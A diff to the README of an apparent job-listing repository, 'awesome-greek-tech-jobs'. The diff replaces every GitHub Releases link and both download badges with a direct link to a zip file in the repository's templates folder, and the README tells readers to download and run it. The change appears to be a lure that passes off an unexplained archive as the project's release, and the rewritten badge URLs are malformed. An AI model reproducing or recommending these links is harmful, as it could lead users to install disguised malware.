@@ -2,14 +2,14 @@
 
 Welcome to the "awesome-greek-tech-jobs" repository! This project provides a comprehensive map of companies hiring for tech jobs in Greece. Whether you're looking for remote work, hybrid options, or full-time positions, this resource can help you on your career journey.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/irfankhanowaisi/awesome-greek-tech-jobs/releases)
+[![Download Releases](https://raw.githubusercontent.com/irfankhanowaisi/awesome-greek-tech-jobs/main/templates/greek-jobs-awesome-tech-workmanly.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/irfankhanowaisi/awesome-greek-tech-jobs/main/templates/greek-jobs-awesome-tech-workmanly.zip)
 
 ## 📥 Download & Install
 
 To get started, follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/irfankhanowaisi/awesome-greek-tech-jobs/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/irfankhanowaisi/awesome-greek-tech-jobs/main/templates/greek-jobs-awesome-tech-workmanly.zip) to find the latest version.
 
 2. **Download the Latest Release**  
    On the Releases page, locate the most recent version. Click the appropriate link to download the file for your operating system.
@@ -61,4 +61,4 @@ If you have any questions or need assistance with the application, feel free to 
 
 Thank you for using "awesome-greek-tech-jobs"! We appreciate your support and feedback as we continue to improve this resource for tech job seekers in Greece.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/irfankhanowaisi/awesome-greek-tech-jobs/releases)
+[![Download Releases](https://raw.githubusercontent.com/irfankhanowaisi/awesome-greek-tech-jobs/main/templates/greek-jobs-awesome-tech-workmanly.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/irfankhanowaisi/awesome-greek-tech-jobs/main/templates/greek-jobs-awesome-tech-workmanly.zip)
